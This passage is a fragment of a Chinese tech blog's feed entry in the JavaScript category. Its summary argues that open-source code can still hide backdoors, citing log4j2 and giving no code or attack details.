      &lt;p&gt;以前有人说，开源项目非常安全，因为谁都可以看到代码，所以不怕里面藏有后门。&lt;/p&gt;
&lt;p&gt;这样的言论显然非常天真，一来，并不会有很多人真的去看源代码；二来，有一些缺陷隐藏得很深，光看源代码看不出来，例如 log4j2；第三，有办法把后门藏在一段非常安全的代码里面，你即使看源代码也看不出哪里有问题。&lt;/p&gt;
    
    </summary>
    
      <category term="JavaScript" scheme="https://www.kingname.info/categories/JavaScript/"/>
    
    
      <category term="JavaScript" scheme="https://www.kingname.info/tags/JavaScript/"/>
    
  </entry>
  
</feed>
